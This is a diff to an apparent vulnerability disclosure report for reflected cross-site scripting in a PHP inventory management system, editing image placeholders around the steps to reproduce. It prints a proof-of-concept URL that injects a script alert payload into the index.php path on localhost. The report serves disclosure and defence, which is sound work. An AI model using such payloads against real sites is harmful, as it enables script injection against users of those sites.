@@ -7,13 +7,14 @@ Reflected XSS attacks, also known as non-persistent attacks, occur when a malici
 # POC
 ## Steps To Reproduce:
 Go to : http://localhost/php-inventory-management-system/index.php
-image
+![Uploading image.png…]()
+
 
 On the url, enter payload after url: cuzh4"><script>alert('XSS')</script>rvhmf
 
 Payload: http://localhost/php-inventory-management-system/index.php/cuzh4"><script>alert('XSS')</script>rvhmf
 
-image
+
 
 # Impact:
 The impact of reflected cross-site scripting (XSS) can be significant and pose various risks to both web applications and users
